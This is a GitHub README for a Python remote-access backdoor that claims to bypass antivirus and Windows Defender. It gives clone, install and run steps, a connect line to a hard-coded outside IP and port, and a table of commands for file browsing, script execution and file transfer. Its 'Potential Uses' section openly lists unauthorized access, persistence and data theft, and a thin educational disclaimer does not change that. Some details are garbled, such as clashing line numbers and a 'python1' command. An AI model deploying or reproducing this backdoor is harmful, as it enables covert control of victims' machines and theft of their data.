## Backdoor-And-Server 🖥️🔍

This is a simple server-client Python application that allows you to remotely execute basic commands on the server from the backdoor. 

We can use this project to establish a connection between a server and backdoor , this code is personally crafted and succesful in bypassing the antivirus and windows defender 🍴✨



## Warning ⚠️☠️

**This project is intended for educational and research purposes only.**

Please use this code responsibly and only on devices and systems for which you have explicit authorization.

The author of this project are not responsible for any misuse or illegal activities involving this software.


## Installation Process 📥

First, clone the repository and navigate to the Backdoor-And-Server directory:

```
$ git clone https://github.com/Advaidv121/Backdoor-And-Server && cd Backdoor-And-Server
```

Next, install the requrements using pip3 with the following instructions:

For **Server.py**
```
$ pip3 install -r srequirements.txt
```
For **Backdoor.py**
```
$ pip3 install -r brequirements.txt
```

## Pre Execution ⏮️

On line number **120** of **server.py** file
```
36. sock.bind(('xx.xxx.xx.xx',xxxx)) #replace 'xx.xxx.xx.xx'
```
On line number **160** of **backdoor.py** file
```
160. s.connect(('68.183.89.11',5555))  #replace 'username' 'password'
```

## Execution 🏃‍♂️

Run the backdoor.py script on the machine you want to control:
```
python backdoor.py
```
Run the server.py script on the machine from which you want to control the server:
```
python server.py
```
This will establish a connection with the server, and you can start sending commands to be executed on the server.🛜

## Available Commands

Here's a table of the commands you can run on the server from the client:

| Command                | Description                                                     |
|------------------------|-----------------------------------------------------------------|
| `ls`                   | List the files and directories in the current directory.        |
| `cd <foldername>`      | Change the current directory to the specified folder.           |
| `cd ..`                | Navigate to the parent directory.                               |
| `pwd`                  | Print the current working directory.                            |
| `cat`                  | Display the contents of a text file.                            |
| `python1 <filename>`   | Execute a Python 1.x script with the specified filename.        |
| `python3 <filename>`   | Execute a Python 3.x script with the specified filename.        |
| `copy <filename>`      | Copy a file from the client to the server.                      |
| `bye`                  | Disconnect from the server.                                     |
| `scrst`                | Command description not provided.                               |
| `send <filename>`      | Send a file to the server.                                      |
| `help`                 | Display a list of available commands.                           |



## Potential Uses 💡

Keyloggers can be used for:

-Unauthorized Access: Malicious actors use backdoors to gain unauthorized access to a computer system, network, or device. This unauthorized access can lead to data theft, surveillance, or further exploitation.

-Remote Control: Backdoors provide remote control over a compromised system. Attackers can manipulate the victim's computer, executing commands and actions without the user's knowledge or consent.

-Persistence: Backdoors are often used to maintain a persistent presence within a compromised network or system. This allows attackers to maintain access even if initial security flaws are patched.

-Data Theft: Backdoors enable the exfiltration of sensitive data, such as personal information, financial records, or intellectual property, which can then be misused or sold.
